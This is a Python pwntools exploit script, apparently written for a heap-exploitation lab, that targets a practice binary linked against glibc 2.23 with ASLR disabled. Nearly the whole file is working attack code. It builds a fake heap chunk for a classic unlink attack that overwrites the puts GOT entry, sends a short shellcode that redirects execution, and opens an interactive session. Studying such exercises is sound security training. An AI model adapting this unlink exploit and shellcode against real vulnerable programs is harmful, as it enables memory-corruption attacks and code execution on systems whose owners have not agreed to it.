#!/usr/bin/env python3

from pwn import * 
import os

mode = 'DEBUGoff' # Turn on gdb
libc_name = '../../../libc_versions/2.23_unlink/libc-2.23_unlink.so' # For alternate version of libc

env = {}

# Binary setup
elf_name = '.unlink-2.23_unlink' 

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	ld = ELF("../../../libc_versions/2.23_unlink/ld-2.23_unlink.so")
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([ld.path, elf.path],env=env, aslr=False)
	gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.23_unlink/
''') 

else: 
	p = process([ld.path, elf.path], env=env, aslr=False) 



def shellcode():
	print("Creating shellcode!:\npush 0x401236;\nret;\n")
	my_shellcode = "\x68\x36\x12\x40\x00\xC3"
	return my_shellcode
	
def unlink(puts_GOT):
	# TODO: Change me. Overwrite 'fd'. Set to function pointer.
	fake_chunk = p64(puts_GOT-0x18) # fd: -0x18 is the OFFSET to where we are writing
	fake_chunk += p64(0x155555424030) # bk: WHAT we want to write  

	print("Unleash the unlinking!") 
	return fake_chunk



puts_GOT = elf.got['puts']
print(puts_GOT)
heap_base = 0x405000 # ASLR is turned off
shellcode_address = heap_base + 0x30 

# ch1 0x155555424030
# ch2 0x1555554240c0
# ch3 0x155555424150

# input("sss")
p.sendline(shellcode())
p.sendline(unlink(puts_GOT)) # Corrupt chunk to perform unlinking later
p.interactive()